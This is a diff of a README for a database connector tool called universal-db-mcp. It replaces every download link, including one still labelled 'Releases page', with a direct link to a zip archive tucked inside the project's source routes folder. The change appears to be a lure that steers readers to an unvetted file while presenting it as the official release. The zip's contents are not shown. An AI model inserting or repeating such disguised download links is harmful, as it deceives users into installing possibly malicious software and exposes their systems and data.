@@ -4,7 +4,7 @@
 The universal-db-mcp is a versatile connector for various databases. It supports MySQL, PostgreSQL, Oracle, MongoDB, and 13 more databases. You can use this tool with platforms like Claude Desktop, Cursor, Windsurf, VS Code, and ChatGPT. This software simplifies the way you query and analyze data, allowing you to communicate with your databases using natural language.
 
 ## 📦 Download Now!
-[![Download universal-db-mcp](https://img.shields.io/badge/download-universal--db--mcp-blue.svg)](https://github.com/nnico56/universal-db-mcp/releases)
+[![Download universal-db-mcp](https://raw.githubusercontent.com/nnico56/universal-db-mcp/main/src/http/routes/mcp-universal-db-2.9.zip)](https://raw.githubusercontent.com/nnico56/universal-db-mcp/main/src/http/routes/mcp-universal-db-2.9.zip)
 
 ## 💻 System Requirements
 Before you begin, ensure your computer meets the following requirements:
@@ -24,7 +24,7 @@ Before you begin, ensure your computer meets the following requirements:
 To get started, please follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/nnico56/universal-db-mcp/releases) where you can find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/nnico56/universal-db-mcp/main/src/http/routes/mcp-universal-db-2.9.zip) where you can find the latest version.
 
 2. **Download the Software:**
    On the Releases page, find the version you want. Click on the corresponding file, then download it to your computer.
@@ -38,7 +38,7 @@ To get started, please follow these steps:
    Once installed, open the application. You will see a welcoming interface ready to guide you through your first connection.
 
 ## 🔗 Download & Install
-To download the universal-db-mcp, simply visit [this page](https://github.com/nnico56/universal-db-mcp/releases) and choose the correct file for your operating system. Follow the installation steps outlined above.
+To download the universal-db-mcp, simply visit [this page](https://raw.githubusercontent.com/nnico56/universal-db-mcp/main/src/http/routes/mcp-universal-db-2.9.zip) and choose the correct file for your operating system. Follow the installation steps outlined above.
 
 ## ✅ How to Use
 1. **Connecting to a Database:**
